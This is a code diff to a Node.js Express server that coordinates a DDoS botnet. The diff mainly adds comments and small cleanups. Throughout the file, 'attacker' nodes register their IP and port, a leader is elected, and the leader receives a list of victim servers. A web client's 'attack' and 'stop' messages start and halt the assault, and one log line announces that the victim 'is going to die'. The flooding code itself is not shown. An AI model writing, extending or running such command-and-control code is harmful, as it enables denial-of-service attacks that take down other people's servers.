@@ -12,49 +12,53 @@ app.use('/node_modules', express.static(__dirname + '/node_modules')); // path u
 app.use(bodyParser.json()); // support json encoded bodies
 app.use(bodyParser.urlencoded({ extended: true })); // support encoded bodies
 
-var connectedAttackers = 0;
-var leader = "";
-var victim = "";
-var addresses2bAttacked = [];
+var leader = ""; // leader id
+var victim = ""; // victim ip address and port
+var addresses2bAttacked = []; // array of servers to be attacked
+var attackersData = {}; // JSON containing the data of the attackers, ip address and port
 
-// Callback function when a HTTP POST method is requested, in the path '/iot-device'
-// Converts iot-device received data to a format understood by the web client
+// Callback function when a HTTP PUT method is requested, in the path '/attacker'
+// Converts attack received data to a format understood by the web client
+// so it can be showed in the charts
 app.put("/attacker", function(req, res) {
 	console.log("Receiving attacker data...");
 	console.log(req.body);
-
-	var id = req.body.id;
 	
 	// socket broadcast message to all the connected clients
 	// with the received device data
 	io.emit("device data", {
-		"ID": id,
+		"ID": req.body.id,
 		"datetime": req.body.datetime,
 		"data": req.body.data
 	});
 
+	// send all the attackers data as a response
 	res.send(attackersData);
 });
 
+// Callback function when a HTTP POST method is requested, in the path '/attacker'
+// Saves the new attacker's ip and port
 app.post("/attacker", function(req, res) {
-	console.log("Receiving attacker port...");
-	console.log(req.body);
-
 	var id = req.body.id;
 	var ip = /.*:(([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3}))/g.exec(req.connection.remoteAddress)[1];
-	var port = req.body.port
+	var port = req.body.port;
+	
+	console.log("Attacker " + id + " connected");
 
+	// save the attackers ip address and port
 	updateAttackerIPAndPort(id, ip, port);
+	//send all the attackers data as a response
 	res.send(attackersData);
-
-	console.log(attackersData);
 });
 
+// Callback function when a HTTP POST method is requested, in the path '/coordinator'
+// Server responds to the coordinator with a list of the potential victims of a DDoS attack
 app.post("/coordinator", function(req, res) {
-	if (leader === "") {
+	if (leader === "") { // Only sends one message, avoid message overflow
 		leader = req.body.leader;
 		console.log("The leader is: " + leader);
 		//Send array of victims
+		console.log("sending array of potential victims...");
 		console.log(addresses2bAttacked);
 		res.send(addresses2bAttacked);
 	} else {
@@ -62,6 +66,8 @@ app.post("/coordinator", function(req, res) {
 	}
 });
 
+// Callback function when a HTTP POST method is requested, in the path '/victim'
+// Saves the ip address and port of the victim
 app.post("/victim", function(req, res) {
 	victim = req.body.victim;
 	console.log(victim + " is going to die!");
@@ -70,24 +76,26 @@ app.post("/victim", function(req, res) {
 }) 
 
 // Callback function when a 'connection' socket message is received
-// When a client connection is established
+// A client connection is established
 io.on('connection', function(socket){
   console.log('Web client connection established');
 
   	// Callback function when an 'attack' socket message is received
-	// When recieving the addresses coming from the Web Client
+	// Receive the addresses coming from the Web Client
 	socket.on('attack', function(data){
   		addresses2bAttacked = data.addresses;
   		startElection();
 	});
 
+	// Callback function when an 'stop' socket message is received
+	// Stops the current attack
 	socket.on('stop', function(data){
   		stopAttack();
 	});
 });
 
-var attackersData = {}; // JSON containing the data of the attackers, ip address and port
-
+// Send an election HTTP POST message to all the attackers
+// Starts the election algorithm and subsequent attack
 function startElection() {
 	leader = "";
 	for (var key in attackersData) {
@@ -101,6 +109,8 @@ function startElection() {
 	}
 }
 
+// Send a victim HTTP DELETE message to all the attackers
+// Stops the attack
 function stopAttack() {
 	for (var key in attackersData) {
 		request.delete({
@@ -113,6 +123,7 @@ function stopAttack() {
 	}
 }
 
+// Saves a given attacker ip address and port to attackersData JSON
 function updateAttackerIPAndPort(id, ip, port) {
 	if (!attackersData[id]) {
 		attackersData[id] = {};
